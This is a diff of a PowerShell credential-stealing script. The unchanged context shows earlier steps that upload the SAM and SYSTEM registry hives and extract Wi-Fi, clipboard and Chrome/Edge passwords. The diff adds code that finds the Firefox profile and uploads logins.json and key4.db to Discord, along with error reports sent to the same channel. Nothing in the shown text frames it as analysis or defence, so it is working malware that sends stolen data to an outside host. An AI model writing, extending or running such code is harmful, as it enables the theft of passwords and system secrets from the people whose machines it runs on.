@@ -51,6 +51,7 @@ try {
     Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved and uploaded."
 } catch {
     Write-Host "Error handling SAM or SYSTEM: $_"
+    Send-PayloadToDiscord -content "Error handling SAM or SYSTEM: $_"
 }
 
 # Extract Wi-Fi Credentials
@@ -86,7 +87,7 @@ try {
     Write-Host "Error extracting clipboard content: $_"
 }
 
-# Extract Browser Saved Credentials
+# Extract Browser Saved Credentials (Google Chrome and Microsoft Edge)
 try {
     $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
     foreach ($browser in $browsers) {
@@ -98,6 +99,32 @@ try {
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
+}
+
+# Extract Firefox Saved Credentials
+try {
+    $firefoxProfilesPath = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
+    $firefoxProfiles = Get-ChildItem -Path $firefoxProfilesPath -Filter "*.default-release" | Select-Object -First 1
+
+    if ($firefoxProfiles) {
+        $profilePath = $firefoxProfiles.FullName
+        $loginsFile = Join-Path $profilePath "logins.json"
+        $keyFile = Join-Path $profilePath "key4.db"
+
+        if (Test-Path $loginsFile -and Test-Path $keyFile) {
+            # Send the files to Discord
+            Send-FileToDiscord -filePath $loginsFile -fileName "Firefox_logins.json"
+            Send-FileToDiscord -filePath $keyFile -fileName "Firefox_key4.db"
+            Send-PayloadToDiscord -content "Firefox credentials files uploaded: logins.json and key4.db"
+        } else {
+            Send-PayloadToDiscord -content "Firefox credentials files not found: logins.json or key4.db"
+        }
+    } else {
+        Send-PayloadToDiscord -content "No Firefox profile found."
+    }
+} catch {
+    Write-Host "Error extracting Firefox credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting Firefox credentials: $_"
 }
 
 # List Files in My Documents
